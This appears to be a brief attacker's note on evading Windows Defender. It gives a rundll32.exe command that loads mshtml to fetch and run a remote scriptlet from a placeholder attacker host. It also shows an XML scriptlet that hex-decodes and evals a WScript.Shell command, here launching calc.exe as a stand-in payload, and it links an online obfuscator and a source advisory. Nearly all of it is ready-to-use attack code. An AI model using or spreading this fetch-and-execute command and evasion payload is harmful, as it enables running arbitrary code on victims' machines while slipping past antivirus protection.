JS payload + bypass windows defender
Obfuscator: https://codebeautify.org/javascript-obfuscator
CMD command: rundll32.exe javascript:"\..\..\..\mshtml, RunHTMLApplication ";document.write();GetObject("script"+":"+"http://{BAD_IP}/JSpayload.tmp")
Original: http://hyp3rlinx.altervista.org/advisories/MICROSOFT_WINDOWS_DEFENDER_DETECTION_BYPASS.txt

{PAYLOAD BEFORE OBFUSCATION}

<?xml version="1.0"?>
<component>
<script>
<![CDATA[
var hex = "6E657720416374697665584F626A6563742822575363726970742E5368656C6C22292E52756E282263616C632E6578652229";

// Hex string is -> new ActiveXObject("WScript.Shell").Run("calc.exe")

var str = '';
for (var n = 0; n < hex.length; n += 2) {
str += String.fromCharCode(parseInt(hex.substr(n, 2), 16));
}
eval(str)
]]>
</script>
</component>
